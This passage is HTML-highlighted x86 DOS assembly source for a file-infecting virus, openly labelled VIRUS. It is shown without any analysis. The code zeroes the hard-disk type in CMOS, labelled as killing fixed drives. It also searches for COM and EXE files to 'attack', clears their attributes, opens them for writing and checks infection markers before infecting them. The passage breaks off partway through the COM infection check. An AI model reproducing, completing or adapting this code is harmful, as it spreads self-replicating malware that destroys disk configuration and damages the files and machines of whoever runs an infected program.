</span><span class="sc1">;**********************************</span><span class="sc0">

</span><span class="sc5">VIRUS</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">010Dh</span><span class="sc0">                            </span><span class="sc1">;get starting address</span><span class="sc0">

</span><span class="sc1">;************************************</span><span class="sc0">
</span><span class="sc1">; Fix DS ES</span><span class="sc0">
</span><span class="sc1">;************************************</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">COM_FLAG</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;save COM/EXE flag in AX</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PSP_SEG</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">    </span><span class="sc1">;save PSP segment for use in PATH search</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                       </span><span class="sc1">;save COM/EXE flag</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                       </span><span class="sc1">;save es and ds in case file is EXE</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">                                    </span><span class="sc1">;es = cs</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">                                    </span><span class="sc1">;ds = cs</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ORIG_IPCS</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;save IP</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ORIG_IPCS</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;save CS</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ORIG_SSSP</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;save SS</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ORIG_SSSP</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;save SP</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_CODE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_CODE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;************************************</span><span class="sc0">
</span><span class="sc1">; redirect DTA onto virus code</span><span class="sc0">
</span><span class="sc1">;************************************</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DTA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;put DTA at the end of the virus for now</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">                </span><span class="sc1">;set new DTA function to ds:dx</span><span class="sc0">
   </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">;************************************</span><span class="sc0">
</span><span class="sc1">; KIll fixed disk drives in CMOS</span><span class="sc0">
</span><span class="sc1">;************************************</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0012h</span><span class="sc0">        </span><span class="sc1">;hard drive type register</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">           </span><span class="sc1">;New hard drive type = 0 (No Fixed drive)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CMOS_CHCKSM</span><span class="sc0">

</span><span class="sc1">;************************************</span><span class="sc0">
</span><span class="sc1">; MAIN Routines called from here</span><span class="sc0">
</span><span class="sc1">;************************************</span><span class="sc0">

          </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">bp</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">COM_MASK</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FIND_FILE</span><span class="sc0">                  </span><span class="sc1">;get a com file to attack!</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">bp</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EXE_MASK</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FIND_FILE</span><span class="sc0">                  </span><span class="sc1">;get an exe file to attack!</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc5">EXIT_VIRUS</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;************************************</span><span class="sc0">
</span><span class="sc1">; set old  DTA  address</span><span class="sc0">
</span><span class="sc1">;************************************</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">            </span><span class="sc1">;fix dta back to ds:dx</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">               </span><span class="sc1">;host program</span><span class="sc0">

           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_CODE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_CODE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">

           </span><span class="sc6">cli</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ORIG_SSSP</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;save SP</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ORIG_SSSP</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;save SS</span><span class="sc0">
           </span><span class="sc6">sti</span><span class="sc0">

           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ORIG_IPCS</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;save CS</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ORIG_IPCS</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;save IP</span><span class="sc0">

           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                </span><span class="sc1">;restore ds</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                </span><span class="sc1">;restore es</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                </span><span class="sc1">;restore COM_FLAG</span><span class="sc0">

           </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">            </span><span class="sc1">;com infection?</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">RESTORE_COM</span><span class="sc0">

</span><span class="sc1">;************************************</span><span class="sc0">
</span><span class="sc1">; restore EXE.. and exit..</span><span class="sc0">
</span><span class="sc1">;************************************</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">                                       </span><span class="sc1">;ds has to be original one</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">low</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ORIG_SSSP</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;restore ss</span><span class="sc0">
   </span><span class="sc6">cli</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ORIG_SSSP</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;restore sp</span><span class="sc0">
   </span><span class="sc6">sti</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ORIG_IPCS</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                                          </span><span class="sc1">;push cs</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ORIG_IPCS</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;push ip</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0CBh</span><span class="sc0">                                         </span><span class="sc1">;retf</span><span class="sc0">

</span><span class="sc1">;************************************</span><span class="sc0">
</span><span class="sc1">; restore 4 original bytes to file</span><span class="sc0">
</span><span class="sc1">;************************************</span><span class="sc0">

</span><span class="sc5">RESTORE_COM</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                                   </span><span class="sc1">;save si</span><span class="sc0">
           </span><span class="sc6">cld</span><span class="sc0">                                       </span><span class="sc1">;clear direction flag</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">START_CODE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0">  </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc1">;source:   ds:si</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">                             </span><span class="sc1">;destination: es:di</span><span class="sc0">
           </span><span class="sc6">movsw</span><span class="sc0">                                     </span><span class="sc1">;shorter &amp; faster than</span><span class="sc0">
           </span><span class="sc6">movsw</span><span class="sc0">                                     </span><span class="sc1">;mov cx,04  and rep movsb</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc0">                                   </span><span class="sc1">;restore si</span><span class="sc0">

</span><span class="sc1">;****************************************************************</span><span class="sc0">
</span><span class="sc1">; zero out registers for return to</span><span class="sc0">
</span><span class="sc1">; host program</span><span class="sc0">
</span><span class="sc1">;****************************************************************</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">     </span><span class="sc1">;return address</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">cwd</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc5">NO_GOOD</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">stc</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GET_OUT</span><span class="sc0">

</span><span class="sc5">QUICK_EXIT</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">stc</span><span class="sc0">                                     </span><span class="sc1">;set carry flag</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">CHECK_N_INFECT_FILE</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;******************</span><span class="sc0">
</span><span class="sc1">; 1-Check TIME ID</span><span class="sc0">
</span><span class="sc1">;******************</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DTA_File_TIME</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;file time from DTA</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1Dh</span><span class="sc0">                                     </span><span class="sc1">;58 seconds?</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1Dh</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">QUICK_EXIT</span><span class="sc0">

</span><span class="sc1">;*********************************************</span><span class="sc0">
</span><span class="sc1">; 2-Clear attributes</span><span class="sc0">
</span><span class="sc1">;*********************************************</span><span class="sc0">

       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WORK_AREA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;dx=ptr to path + current filename</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                              </span><span class="sc1">;set attributes to normal</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                           </span><span class="sc1">;set file attributes to cx</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                </span><span class="sc1">;int 21h</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">QUICK_EXIT</span><span class="sc0">                         </span><span class="sc1">;error.. quit</span><span class="sc0">

</span><span class="sc1">;*****************</span><span class="sc0">
</span><span class="sc1">; 3-OPEN FILE</span><span class="sc0">
</span><span class="sc1">;*****************</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">                        </span><span class="sc1">;r/w access to it</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">   </span><span class="sc5">NO_GOOD</span><span class="sc0">                         </span><span class="sc1">;error.. quit</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                           </span><span class="sc1">;bx = file handle</span><span class="sc0">

</span><span class="sc1">;********************</span><span class="sc0">
</span><span class="sc1">; 4-Read 1st 28 bytes</span><span class="sc0">
</span><span class="sc1">;********************</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">28d</span><span class="sc0">                        </span><span class="sc1">;read first 5 bytes of file</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_CODE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;store'em here</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                        </span><span class="sc1">;DOS read function</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">   </span><span class="sc5">NO_GOOD</span><span class="sc0">                       </span><span class="sc1">;error? get next file</span><span class="sc0">

</span><span class="sc1">;*********************</span><span class="sc0">
</span><span class="sc1">; 5-CHECK FILE</span><span class="sc0">
</span><span class="sc1">;*********************</span><span class="sc0">

       </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_CODE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">   </span><span class="sc1">;EXE file?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">CHECK_EXE</span><span class="sc0">                                 </span><span class="sc1">;no? check com</span><span class="sc0">

       </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_CODE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">],</span><span class="sc12">'MZ'</span><span class="sc0">  </span><span class="sc1">;EXE file?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">CHECK_EXE</span><span class="sc0">                                </span><span class="sc1">;no? check com</span><span class="sc0">

</span><span class="sc5">CHECK_COM</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DTA_File_SIZE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get file's size</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                       </span><span class="sc1">;insert new entry point just in case..</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DECRYPTOR_SIZE</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">

            </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">FINAL</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0">            </span><span class="sc1">;add virus size to it</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">   </span><span class="sc5">NO_GOOD</span><span class="sc0">                                   </span><span class="sc1">;bigger then 64K:nogood</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_CODE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">],</span><span class="sc2">0E9H</span><span class="sc0">   </span><span class="sc1">;compare 1st byte to near jmp</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">INFECT_COM</span><span class="sc0">                          </span><span class="sc1">;not a near jmp, file ok</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_CODE</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">],</span><span class="sc2">20h</span><span class="sc0">  </span><span class="sc1">;check for ' '</span><span class="sc0">
